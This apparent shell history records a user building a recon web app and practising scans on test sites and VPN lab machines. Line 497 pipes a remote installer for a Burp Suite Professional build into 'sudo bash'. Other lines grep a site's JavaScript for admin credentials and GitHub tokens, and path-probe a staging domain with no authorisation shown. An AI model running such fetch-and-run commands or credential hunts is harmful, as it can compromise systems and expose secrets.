+  340  pip install -r requirements.txt
+  341  python3 -m venv venv\nsource venv/bin/activate
+  342  python3 -m venv venv\n
+  343  sudo python3 -m venv venv\n
+  344  source venv/bin/activate\n
+  345  sudo apt update\nsudo apt install python3.11-venv -y\n
+  346  python3 -V\n
+  347  sudo apt update\nsudo apt install python3.11.9-venv -y\n
+  348  python3 -m venv venv\n
+  349  source venv/bin/activate\n
+  350  sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5\n
+  351  sudo apt update\n
+  352  python3 -V\n
+  353  sudo apt install python3.11-venv -y\n
+  354  sudo apt update\nsudo apt install python3 python3-pip python3-venv -y
+  355  python3 -m venv venv\nsource venv/bin/activate\n
+  356  python -m venv venv\n.\venv\Scripts\activate
+  357  python3 -m venv venv\nsource venv/bin/activate
+  358  pip install fastapi "uvicorn[standard]" sqlalchemy
+  359  pip freeze > requirements.txt
+  360  uvicorn app.main:app --reload
+  361  python scripts/populate_db.py
+  362  uvicorn app.main:app --reload
+  363  pip install jinja2
+  364  pip freeze > requirements.txt
+  365  uvicorn app.main:app --reload
+  366  uvicorn app.main:app
+  367  uvicorn app.main:app --reload
+  368  sudo lsof -i :8000
+  369  kill -9 35497
+  370  uvicorn app.main:app --reload
+  371  sudo lsof -i :8000
+  372  kill -9 42025
+  373  kill -9 43022
+  374  uvicorn app.main:app --reload
+  375  sudo openvpn SANKALP.ovpn
+  376  mousepad gitpush.sh
+  377  chmod +x gitpush.sh\n
+  378  ./gitpush.sh\n
+  379  exit
+  380  git init
+  381  git remote add origin https://github.com/sankalpvb/ReconMaster.git\ngit branch -M main\ngit push -u origin main
+  382  git add README.md\ngit commit -m "first commit"\ngit branch -M main\ngit remote add origin https://github.com/sankalpvb/ReconMaster.git\ngit push -u origin main
+  383  git init\ngit remote add origin https://github.com/sankalpvb/REconMaster\ngit add .\ngit commit -m "Force pushing latest code"\ngit push -f origin main\n
+  384  exit
+  385  nmap scanme.nmap.org
+  386  uvicorn app.main:app --reload
+  387  nmap -T4 scanme.nmap.org
+  388  ping -c 4 scanme.nmap.org
+  389  dig scanme.nmap.org
+  390  nslookup scanme.nmap.org
+  391  nmap -T4 scanme.nmap.org
+  392  python scripts/populate_db.py
+  393  uvicorn app.main:app --reload
+  394  ./gitpush.sh\n
+  395  sudo apt update && sudo apt install gobuster
+  396  ./gitpush.sh\n
+  397  httpx -h
+  398  echo export PATH=$PATH:$HOME/go/bin >> $HOME/.bashrc\nsource $HOME/.bashrc
+  399  clear
+  400  exit
+  401  sudo echo export PATH=$PATH:$HOME/go/bin >> $HOME/.bashrc\nsource $HOME/.bashrc
+  402  hello
+  403  httpx
+  404  httpx -h
+  405  exit
+  406  $home/go/bin/httpx
+  407  ~/go/bin/httpx\n
+  408  ~/go/bin/httpx -h
+  409  httpx -h
+  410  echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc\nsource ~/.bashrc\n
+  411  ls ~/go/bin/httpx\n
+  412  exit
+  413  ls ~/go/bin/httpx\n
+  414  echo $PATH
+  415  httpx -h
+  416  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.bashrc\nsource ~/.bashrc\n
+  417  clear
+  418  exit
+  419  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.bashrc\nsource ~/.bashrc\n
+  420  exit
+  421  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.zshrc\nsource ~/.zshrc\n
+  422  which httpx
+  423  httpx -h
+  424  echo "https://scanme.nmap.org" | httpx\n
+  425  httpx --help\n
+  426  httpx
+  427  sudo pip3 uninstall httpx
+  428  sudo pip3 uninstall httpx --break-system-packages
+  429  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+  430  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.zshrc && source ~/.zshrc
+  431  httpx -h
+  432  sudo pip3 uninstall httpx --break-system-packages
+  433  which httpx
+  434  sudo rm /usr/bin/httpx
+  435  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+  436  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.zshrc && source ~/.zshrc
+  437  httpx -h
+  438  python scripts/populate_db.py
+  439  httpx -sc -title -tech-detect -no-color -u google.co
+  440  httpx --help\n
+  441  sudo apt remove httpx
+  442  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+  443  echo 'export PATH=$PATH:/home/kali/go/bin' >> ~/.zshrc && source ~/.zshrc
+  444  httpx -h
+  445  httpx --help
+  446  sudo pip3 uninstall httpx
+  447  httpx -h
+  448  httpx -sc -title -tech-detect -no-color -u google.com 
+  449  uvicorn app.main:app --reload
+  450  httpx -sc -title -tech-detect -no-color -u google.com
+  451  httpx -silent -no-color -u google.com\n
+  452  https://google.com [301] [301 Moved] [Google Web Server,HTTP/3]\n
+  453  httpx -sc -title -tech-detect -silent -no-color -u google.com\n
+  454  uvicorn app.main:app --reload
+  455  uvicorn app.main:app --reload
+  456  uvicorn app.main:app --reload
+  457  uvicorn app.main:app --reload
+  458  ./gitpush.sh\n
+  459  sudo apt install httpx ffuf whois nikto
+  460  sudo apt install ffuf whois nikto
+  461  apt --fix-missing
+  462  sudo apt get update
+  463  sudo apt-get update
+  464  sudo apt install ffuf
+  465  sudo apt install whois
+  466  sudo apt-get update
+  467  sudo apt install whois
+  468  sudo apt install nikto
+  469  whois http://testphp.vulnweb.com 
+  470  whois vulnweb.com 
+  471  uvicorn app.main:app --reload
+  472  python scripts/populate_db.py
+  473  uvicorn app.main:app --reload
+  474  ./gitpush.sh\n
+  475  uvicorn app.main:app --reload
+  476  ./setup.sh
+  477  sudo ./setup.sh
+  478  sudo su
+  479  chmod +x setup.sh
+  480  sudo ./setup.sh
+  481  ./gitpush.sh\n
+  482  uvicorn app.main:app --reload
+  483  sudo openvpn SANKALP.ovpn
+  484  shutdown now
+  485  uvicorn app.main:app --reload
+  486  mousepad recon_ip.sh
+  487  chmod +x recon_ip.sh
+  488  ./recon_ip.sh
+  489  ./recon_ip.sh 10.201.7.156
+  490  sudo openvpn SANKALP.ovpn
+  491  uvicorn app.main:app --reload
+  492  mousepad mypaths.txt
+  493  mousepad mypaths.py
+  494  python mypaths.py --domain https://chainabuse-staging.com --paths mypaths.txt --delay 6
+  495  vim hello.svg
+  496  sudo openvpn SANKALP.ovpn
+  497  sudo apt update && sudo apt install -y wget && wget -qO- https://raw.githubusercontent.com/xiv3r/Burpsuite-Professional/main/install.sh | sudo bash
+  498  burpsuitepro
+  499  exit
+  500  base64 L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==~ > text.txt 
+  501  cd ..
+  502  sudo /etc/hosts
+  503  sudo mousepad /etc/hosts
+  504  /etc/hosts
+  505  sudo /etc/hosts
+  506  sudo openvpn SANKALP.ovpn
+  507  ping 10.201.82.6
+  508  nmap -sU -F -v 10.201.82.6
+  509  sudo nmap -sU -F -v 10.201.82.6
+  510  nslookup -type=any magenta.ctfio.com 8.8.8.8
+  511  nslookup -type=any https://magenta.ctfio.com/ 8.8.8.8
+  512  nslookup -type=any https://magenta.ctfio.com 8.8.8.8
+  513  nslookup -type=any https://magenta.ctfio 8.8.8.8
+  514  ping 10.201.113.12
+  515  sudo openvpn SANKALP.ovpn
+  516  sudo nano /etc/hosts\n
+  517  sudo op
+  518  ping -c 1 target.example.com
+  519  ping 10.201.113.12
+  520  curl -I https://sankalpvb.github.io/MyStuf/
+  521  curl -v https://sankalpvb.github.io/MyStuf/
+  522  curl -L -o script.html https://sankalpvb.github.io/MyStuf/admin.html 
+  523  cat script.html
+  524  curl -L -o script.html https://sankalpvb.github.io/MyStuf/script.js
+  525  cat script.html
+  526  curl -X POST -d "username=admin&password:123" https://sankalpvb.github.io/MyStuf/admin.html -i
+  527  curl -i -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=123" "https://sankalpvb.github.io/MyStuf/admin.html" 
+  528  curl -X POST -d "username=admin&password=123" https://sankalpvb.github.io/MyStuf/admin.html -i
+  529  curl https://sankalpvb.github.io/MyStuf/admin.html -i
+  530  curl -i -o script2.html https://sankalpvb.github.io/MyStuf/script.js
+  531  cat script2.html >> ||clip
+  532  cat script2.html
+  533  fTOKEN="ghp_xxx" \ncurl -s -H "Authorization: token $TOKEN" \\n"https://api.github.com/repos/sankalpvb/MyStuf/contents/poems.json" | jq -r .sha\n
+  534  fTOKEN="ghp_xxx" \ncurl -s -H "Authorization: token $TOKEN" \\n"https://api.github.com/repos/sankalpvb/MyStuf/contents/poems.json" | script2.html -r .sha\n
+  535  ls
+  536  file
+  537  curl -s https://sankalpvb.github.io/MyStuf/script.js | grep -m "adminCredentials\|github-token"
+  538  curl -s https://sankalpvb.github.io/MyStuf/script.js | grep -nE "adminCredentials\|github-token"
+  539  grep -nE 'adminCredentials|github-token' script.js
+  540  grep -nE 'adminCredentials|github-token' script2.html
+  541  curl -s https://sankalpvb.github.io/MyStuf/script.js | grep -m1 -nE 'adminCredentials|github-token'\n
+  542  curl -i -o vuln.html http://testphp.vulnweb.com/logout.php
+  543  cat vuln.html
+  544  mousepad vuln.html
+  545  mkdir practice
+  546  cd practice
+  547  export histtimeformat="%F %T "
+  548  history > bash_history_$(data +%F).txt
